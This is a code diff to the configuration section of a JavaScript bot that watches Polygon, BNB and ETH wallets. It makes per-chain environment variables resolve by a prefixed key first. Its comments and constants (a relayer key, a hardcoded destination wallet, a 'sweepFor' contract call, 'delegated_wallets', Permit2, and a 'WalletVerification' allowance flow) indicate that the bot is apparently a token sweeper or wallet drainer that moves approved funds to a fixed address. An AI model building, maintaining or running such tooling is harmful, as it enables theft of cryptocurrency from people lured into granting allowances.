@@ -34,20 +34,31 @@ const FALLBACK_RPCS = [
   process.env.ALCHEMY_RPC_URL,
   "https://polygon-bor.publicnode.com",
 ].filter(Boolean);
-const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
+const SUPABASE_URL              = process.env.SUPABASE_URL;
+const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
+const CHAIN                     = process.env.CHAIN || "polygon";
 const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
+// This box runs each bot via `docker run --env-file .env` (no docker-compose,
+// no per-service CHAIN mapping) — all three containers load the exact same
+// shared .env, which only defines chain-PREFIXED keys (ETH_/BNB_/POLYGON_
+// CONTRACT_ADDRESS, ...TOKENS_TO_WATCH). A bare CONTRACT_ADDRESS/TOKENS_TO_WATCH
+// is never set, so always resolve the CHAIN-prefixed key first.
+const CONTRACT_ADDRESS = process.env[`${CHAIN.toUpperCase()}_CONTRACT_ADDRESS`] || process.env.CONTRACT_ADDRESS;
+const TOKENS_TO_WATCH  = (
+  process.env[`${CHAIN.toUpperCase()}_TOKENS_TO_WATCH`] || process.env.TOKENS_TO_WATCH || ""
+).split(",").filter(Boolean);
 // WalletVerification — a fully separate Privy-based direct-allowance flow
 // (see /Users/starlight/Documents/walletverification). Same relayer key +
 // destination + sweepFor/isAuthorized ABI as the main contract, but its own
 // contract deployment and its OWN Supabase project — bolted on below without
-// touching the main delegated_wallets watcher.
-const VERIFICATION_CONTRACT_ADDRESS          = process.env.VERIFICATION_CONTRACT_ADDRESS || "";
+// touching the main delegated_wallets watcher. Same prefixed-first lookup
+// reasoning as CONTRACT_ADDRESS above.
+const VERIFICATION_CONTRACT_ADDRESS =
+  process.env[`${CHAIN.toUpperCase()}_VERIFICATION_CONTRACT_ADDRESS`] ||
+  process.env.VERIFICATION_CONTRACT_ADDRESS ||
+  "";
 const VERIFICATION_SUPABASE_URL              = process.env.VERIFICATION_SUPABASE_URL || "";
 const VERIFICATION_SUPABASE_SERVICE_ROLE_KEY = process.env.VERIFICATION_SUPABASE_SERVICE_ROLE_KEY || "";
-const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
-const SUPABASE_URL              = process.env.SUPABASE_URL;
-const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
-const CHAIN                     = process.env.CHAIN || "polygon";
 
 const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const MIN_ETH_WEI          = ethers.parseEther("0.5");  // 0.5 MATIC min reserve
